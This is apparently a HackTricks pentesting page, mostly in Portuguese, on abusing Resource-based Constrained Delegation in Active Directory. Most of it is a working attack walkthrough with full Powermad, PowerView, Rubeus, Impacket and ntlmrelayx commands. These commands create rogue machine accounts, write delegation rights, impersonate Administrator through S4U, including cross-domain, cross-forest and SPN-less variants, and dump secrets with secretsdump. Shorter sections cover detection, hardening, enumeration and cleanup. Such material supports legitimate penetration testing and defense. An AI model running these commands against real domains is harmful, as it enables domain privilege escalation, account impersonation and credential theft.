# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Isso é semelhante à [Constrained Delegation](constrained-delegation.md) básica, mas **em vez** de conceder permissões a um **objeto** para **se passar por qualquer usuário contra uma máquina**, a Resource-based Constrained Delegation **define**, no **objeto**, quem pode se passar por qualquer usuário contra ele.

Nesse caso, o objeto restrito terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode se passar por qualquer outro usuário contra ele.

Outra diferença importante entre esta Constrained Delegation e as outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o atributo **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nas outras formas de Delegation, eram necessários privilégios de domain admin).

### New Concepts

Na Constrained Delegation, foi dito que a flag **`TrustedToAuthForDelegation`**, dentro do valor _userAccountControl_ do usuário, é necessária para executar um **S4U2Self.** Mas isso não é completamente verdade.\
A realidade é que, mesmo sem esse valor, você pode executar um **S4U2Self** contra qualquer usuário se for um **service** (tiver um SPN), mas, se você **tiver `TrustedToAuthForDelegation`**, o TGS retornado será **Forwardable**; se **não tiver** essa flag, o TGS retornado **não** será **Forwardable**.

No entanto, se o **TGS** usado no **S4U2Proxy** **não for Forwardable**, uma tentativa de abusar de uma **basic Constrain Delegation** **não funcionará**. Porém, se você estiver tentando explorar uma **Resource-Based constrain delegation**, ela funcionará.

### Attack structure

> Se você tiver **privilégios equivalentes de escrita** sobre uma conta de **Computer**, poderá obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o computador da vítima**.

1. O atacante **compromete** uma conta que tenha um **SPN** ou **cria uma** (“Service A”). Observe que qualquer _Admin User_ sem nenhum outro privilégio especial pode **criar até 10 objetos Computer** (**_MachineAccountQuota_**) e definir um **SPN** neles. Portanto, o atacante pode simplesmente criar um objeto Computer e definir um SPN.
2. O atacante **abusa de seu privilégio WRITE** sobre o computador da vítima (ServiceB) para configurar uma resource-based constrained delegation que permita ao ServiceA se passar por qualquer usuário contra esse computador da vítima (ServiceB).
3. O atacante usa o Rubeus para executar um **ataque S4U completo** (S4U2Self e S4U2Proxy) do Service A para o Service B, em nome de um usuário **com acesso privilegiado ao Service B**.
1. S4U2Self (a partir da conta comprometida/criada com SPN): solicita um **TGS do Administrator para mim** (Not Forwardable).
2. S4U2Proxy: usa o **TGS não Forwardable** da etapa anterior para solicitar um **TGS** do **Administrator** para o **host da vítima**.
3. Mesmo usando um TGS não Forwardable, como você está explorando uma Resource-based constrained delegation, isso funcionará.
4. O atacante pode fazer **pass-the-ticket** e **se passar pelo usuário** para obter **acesso ao ServiceB da vítima**.

Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um objeto de computador

Você pode criar um objeto de computador dentro do domínio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando Resource-based Constrained Delegation

**Usando o módulo PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando PowerView**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

Antes de tudo, criamos o novo objeto Computer com a senha `123456`, portanto precisamos do hash dessa senha:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso imprimirá os hashes RC4 e AES dessa conta.\
Agora, o ataque pode ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets para mais serviços fazendo apenas uma solicitação, usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Observe que os usuários têm um atributo chamado "**Cannot be delegated**". Se esse atributo estiver definido como True para um usuário, você não poderá personificá-lo. Essa propriedade pode ser visualizada no bloodhound.

### Ferramentas Linux: RBCD de ponta a ponta com Impacket (2024+)

Se você operar a partir do Linux, poderá executar toda a cadeia de RBCD usando as ferramentas oficiais do Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Se a assinatura LDAP/LDAPS for imposta, use `impacket-rbcd -use-ldaps ...`.
- Prefira chaves AES; muitos domínios modernos restringem RC4. Impacket e Rubeus oferecem suporte a fluxos somente com AES.
- O Impacket pode reescrever o `sname` ("AnySPN") para algumas ferramentas, mas obtenha o SPN correto sempre que possível (por exemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD entre domínios e entre forests

Se o **principal de delegação** que você controla estiver em um **domínio diferente** (ou até mesmo em uma **forest diferente**) do **computador de recurso**, o abuso ainda será **RBCD**, mas o fluxo de tickets não será mais o usual `S4U2Self -> S4U2Proxy` de um único domínio.

### RBCD entre domínios: configure o principal externo usando o SID

Quando você define `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir de um **domínio diferente**, a máquina/o usuário externo pode **não ser resolvível pelo nome** no LDAP do domínio de destino. Nesse caso, configure a entrada de delegação usando o **SID** do principal externo em vez do sAMAccountName/UPN.

Isso é especialmente relevante ao fazer relay de NTLM para LDAP com `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` informa ao `ntlmrelayx.py` para tratar `--escalate-user` como um SID, o que é necessário quando a conta delegadora é estrangeira ao domínio-alvo.
- Mesmo que a ferramenta exiba `User not found in LDAP`, a escrita da delegação ainda pode ser bem-sucedida, pois o security descriptor armazena diretamente o SID estrangeiro.

### RBCD entre domínios: sequência S4U entre realms

Quando o foreign principal está em `msDS-AllowedToActOnBehalfOfOtherIdentity`, o fluxo cross-domain funcional é:

1. Obter um **TGT** para o principal delegador a partir do próprio domínio.
2. Solicitar um **referral TGT** para `krbtgt/<target-domain>`.
3. Solicitar um **cross-realm S4U2Self referral** para o usuário impersonated no DC do target-domain.
4. Solicitar o ticket **S4U2Self** efetivo para esse usuário novamente no domínio do delegador.
5. Executar **S4U2Proxy** no domínio do delegador para obter um referral ticket para o target domain.
6. Executar o **S4U2Proxy** final no DC do target-domain para obter o service ticket para `cifs/host.target`, `host/host.target`, etc.

É por isso que as ferramentas Linux padrão frequentemente falham em RBCD cross-domain:
- o **realm** da requisição pode precisar ser diferente do realm do TGT usado no `TGS-REQ`
- a cadeia precisa de **etapas S4U2Proxy independentes**, e não apenas de `S4U2Self` ou de `S4U2Self` imediatamente seguido por um único `S4U2Proxy`

### RBCD cross-domain a partir do Linux

A Synacktiv publicou uma implementação do Impacket `getST.py` que reproduz a sequência cross-realm a partir do Linux, tratando explicitamente os dois KDCs:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operacionalmente, os novos argumentos são:
- `-dc-ip`: DC do domínio **delegante**
- `-targetdomain`: domínio do **resource computer**
- `-targetdc`: DC do domínio do **resource**

### Limitações do Cross-forest RBCD

O Cross-forest RBCD tem uma limitação importante: **o usuário impersonado deve pertencer à mesma forest que o principal delegante**. Em outras palavras, se sua machine account controlada estiver em `valhalla.local` e o resource target estiver em `asgard.local`, geralmente você **não poderá impersonar usuários arbitrários de `asgard.local`** nesse resource via RBCD.

Ele ainda é explorável quando:
- o usuário da **delegating forest** é **local admin** (ou possui outros privilégios) no host do resource na outra forest
- uma trust permite o authentication path necessário e o SID estrangeiro é aceito no security descriptor do target computer

### Particularidades do protocolo Cross-forest RBCD

O Cross-forest RBCD não é apenas "cross-domain com uma trust". O fluxo observado inclui duas particularidades que ferramentas comuns historicamente não tratam:

1. Uma solicitação extra de **S4U2Proxy** que define `PA-PAC-OPTIONS=branch-aware`
2. Um service ticket final que pode ser retornado usando **RC4**, mesmo quando outros etypes foram solicitados

O fluxo prático é:

1. Obter um TGT para o principal delegante na forest A.
2. Solicitar **S4U2Self** para o usuário impersonado na forest A.
3. Solicitar **S4U2Proxy** na forest A para obter um referral TGT para a forest B.
4. Enviar uma segunda solicitação **S4U2Proxy** na forest A **sem o ticket S4U2Self como additional ticket**, mas com `branch-aware` habilitado, para obter outro referral TGT para a forest B.
5. Opcionalmente, solicitar um service ticket normal na forest B para o principal delegante (esse ticket não é necessário para o abuso final).
6. Usar os referral tickets das etapas 3 e 4 para solicitar o ticket **S4U2Proxy** final na forest B para o usuário da forest A impersonado, destinado ao target SPN.

### Cross-forest RBCD a partir do Linux

A mesma branch do Synacktiv Impacket adiciona uma switch `-forest` para essa lógica:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD recursivo entre múltiplos domínios (3+ domínios)

Em **florestas com múltiplos domínios**, tanto **S4U2Self** quanto **S4U2Proxy** podem ser **recursivos**, em vez de parar após uma única referral:

- **S4U2Self recursivo**: o primeiro `S4U2Self` é enviado ao **domínio do usuário impersonado**, os saltos intermediários entre domínios pai/filho são percorridos com referrals normais de `TGS-REQ` para `krbtgt/<REALM>`, e o **`S4U2Self` final** é enviado no **próprio domínio do principal de delegação**.
- Isso significa que **ter apenas um TGT** de uma conta de máquina pode ser suficiente para impersonar um **admin de outro domínio na mesma forest** e solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- O **S4U2Proxy recursivo** segue a cadeia de confiança da mesma forma: os saltos intermediários reutilizam o ticket anterior como TGT enquanto solicitam a próxima referral de `krbtgt/<REALM>`, e somente o último salto retorna o service ticket final.

Um exemplo prático na mesma forest é:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD entre domínios / entre forests sem SPN

Se o **delegating principal for um usuário sem SPN**, o último `S4U2Self` recursivo falhará com **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. A solução alternativa é **refazer apenas o salto final como `S4U2Self+U2U`**.

Versão resumida da cadeia de abuso:

1. Autentique-se com o **hash NT** para induzir o KDC a usar **RC4-HMAC (etype 23)**.
2. Solicite `-self -u2u` primeiro e mantenha esse ticket separado da etapa de proxy posterior.
3. Extraia a chave de sessão do **TGT** com `describeTicket.py`.
4. Substitua o **hash NT** do usuário por essa **chave de sessão** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilize o ticket `S4U2Self+U2U` como **`-additional-ticket`** durante uma solicitação `-proxy` separada.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Observações operacionais:

- Quando o **primeiro trust hop já for outra forest**, prefira o algoritmo **branch-aware** (`getST.py ... -forest`) para corresponder ao comportamento nativo do Windows. Se a foreign forest só for alcançada **mais tarde** na cadeia, o fluxo recursivo não branch-aware ainda poderá funcionar.
- Em DCs **Windows Server 2022/2025** recentes, forçar RC4 pode falhar com **`KDC_ERR_ETYPE_NOSUPP`** devido à descontinuação do RC4; isso pode tornar o **SPN-less RBCD** impossível, embora o RBCD clássico baseado em SPN ainda funcione com AES.
- Execute **`S4U2Self+U2U` antes de alterar o hash/senha do usuário**: `SamrChangePasswordUser` **não** recalcula as chaves AES Kerberos da conta, portanto alterar a senha primeiro pode interromper solicitações posteriores de tickets.
- A conta personificada ainda deve ser **delegável**: **Protected Users** e contas com **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloqueiam a cadeia.

## Notas de detecção / hardening

- Os caminhos de RBCD entre domínios/forests ainda são normalmente criados por meio de **ACL abuse** ou **relay-to-LDAP**. Force **LDAP signing** e **LDAP channel binding** nos DCs para interromper os caminhos comuns de configuração.
- Audite quem pode gravar `msDS-AllowedToActOnBehalfOfOtherIdentity` em objetos de computador e resolva os SIDs armazenados, incluindo **foreign security principals**.
- Em ambientes com muitos trusts, revise **Selective Authentication**, **SID filtering** e se usuários de uma foreign forest possuem privilégios de **local admin** nos hosts de recursos.

### Acessando

A última linha de comando executará o **ataque S4U completo e injetará o TGS** do Administrator no host vítima, **em memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrator; portanto, você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes tickets de serviço

Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).

## Enumeração, auditoria e limpeza

### Enumerar computadores com RBCD configurado

PowerShell (decodificando o SD para resolver os SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (ler ou limpar com um comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpeza / redefinição do RBCD

- PowerShell (limpar o atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erros do Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para um usuário normal: o principal delegador provavelmente **não possui SPN**. Tente novamente o **último salto** como **`S4U2Self+U2U`**, em vez de um `S4U2Self` regular.
- **`KDC_ERR_ETYPE_NOSUPP`** durante **SPN-less RBCD**: DCs recentes podem rejeitar o caminho **RC4-HMAC** forçado exigido pelo truque de `S4U2Self+U2U` + substituição da chave de sessão. Tente um caminho clássico de **SPN-backed** RBCD com AES.
- **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do horário do DC e o kerberos não está funcionando corretamente.
- **`preauth_failed`**: Isso significa que o username + hashes fornecidos não estão funcionando para fazer login. Você pode ter esquecido de colocar o "$" dentro do username ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Isso pode significar:
- O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não possui privilégios suficientes)
- O serviço solicitado não existe (se você solicitar um ticket para winrm, mas o winrm não estiver em execução)
- O fakecomputer criado perdeu os privilégios sobre o servidor vulnerável e você precisa concedê-los novamente.
- Você está abusando do KCD clássico; lembre-se de que o RBCD funciona com tickets S4U2Self não encaminháveis, enquanto o KCD exige tickets encaminháveis.

## Observações, relays e alternativas

- Você também pode gravar o RBCD SD por meio do AD Web Services (ADWS) se o LDAP estiver filtrado. Veja:


{{#ref}}
adws-enumeration.md
{{#endref}}

- As cadeias de Kerberos relay frequentemente terminam em RBCD para obter SYSTEM local em uma única etapa. Veja exemplos práticos de ponta a ponta:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se LDAP signing/channel binding estiverem **desabilitados** e você puder criar uma conta de máquina, ferramentas como **KrbRelayUp** podem fazer relay de uma autenticação Kerberos coagida para o LDAP, definir `msDS-AllowedToActOnBehalfOfOtherIdentity` para a conta de máquina no objeto do computador-alvo e impersonar imediatamente **Administrator** por meio de S4U a partir de outro host.

## Referências

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
